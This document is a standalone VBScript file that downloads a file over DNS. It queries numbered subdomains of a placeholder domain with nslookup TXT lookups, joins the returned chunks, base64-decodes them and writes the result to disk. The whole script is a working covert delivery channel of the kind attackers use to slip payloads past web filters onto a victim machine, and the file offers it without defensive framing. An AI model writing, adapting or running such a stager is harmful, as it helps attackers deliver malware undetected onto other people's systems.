Sub DownloadDNS
	domainBased = <Domain>
    filenameOutput = <output filename>
	Dim endLoop
	endLoop = False
	chunks = ""
	i = 0
	Do While endLoop = False
		domain = i & ".d." & domainBased
		chunk = DownloadChunk(domain)
		if chunk <> "" Then
			chunks = chunks & chunk
			i = i + 1
		Else			
			endLoop = True
		End If
    Loop
	'output_area.innerHTML = chunks
	DecodeBase64 chunks, filenameOutput
End Sub

Function DownloadChunk(domain)
	cmd = "nslookup.exe -type=TXT " & domain '& " <hardcoded dns server>"
	Set objShell = CreateObject("Wscript.Shell")
	Set exec = objShell.Exec(cmd)
	strOutput = exec.StdOut.ReadAll
	If Ubound(Split(strOutput)) + 1 > 5 Then
		' chr(34) is "
		strOutput = Split(Split(strOutput)(5),chr(34))(1)
	Else
		strOutput = ""
	End If
	DownloadChunk = strOutput

End Function

Function DecodeBase64(data, fileName)
	outputFile = ".\" & filename

	Set oXML = CreateObject("Msxml2.DOMDocument")
	Set oNode = oXML.CreateElement("base64")
	oNode.dataType = "bin.base64"
	oNode.text = data
	Const adTypeText = 2
	Const adTypeBinary = 1
	
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objFile = objFSO.CreateTextFile(outputFile)
	objFile.Write(RSBinaryToString(oNode.nodeTypedValue))
	objFile.Close
	Set objFile=Nothing
	Set objFSO=Nothing
End Function




Private Function RSBinaryToString(xBinary)
    'Antonin Foller, http://www.motobit.com
    'RSBinaryToString converts binary data (VT_UI1 | VT_ARRAY Or MultiByte string)
    'to a string (BSTR) using ADO recordset

    Dim Binary
    'MultiByte data must be converted To VT_UI1 | VT_ARRAY first.
    If vartype(xBinary)=8 Then Binary = MultiByteToBinary(xBinary) Else Binary = xBinary

    Dim RS, LBinary
    Const adLongVarChar = 201
    Set RS = CreateObject("ADODB.Recordset")
    LBinary = LenB(Binary)

    If LBinary>0 Then
        RS.Fields.Append "mBinary", adLongVarChar, LBinary
        RS.Open
        RS.AddNew
        RS("mBinary").AppendChunk Binary 
        RS.Update
        RSBinaryToString = RS("mBinary")
    Else  
        RSBinaryToString = ""
    End If
End Function

Function MultiByteToBinary(MultiByte)
    '© 2000 Antonin Foller, http://www.motobit.com
    ' MultiByteToBinary converts multibyte string To real binary data (VT_UI1 | VT_ARRAY)
    ' Using recordset
    Dim RS, LMultiByte, Binary
    Const adLongVarBinary = 205
    Set RS = CreateObject("ADODB.Recordset")
    LMultiByte = LenB(MultiByte)
    If LMultiByte>0 Then
        RS.Fields.Append "mBinary", adLongVarBinary, LMultiByte
        RS.Open
        RS.AddNew
        RS("mBinary").AppendChunk MultiByte & ChrB(0)
        RS.Update
        Binary = RS("mBinary").GetChunk(LMultiByte)
    End If
    MultiByteToBinary = Binary
End Function
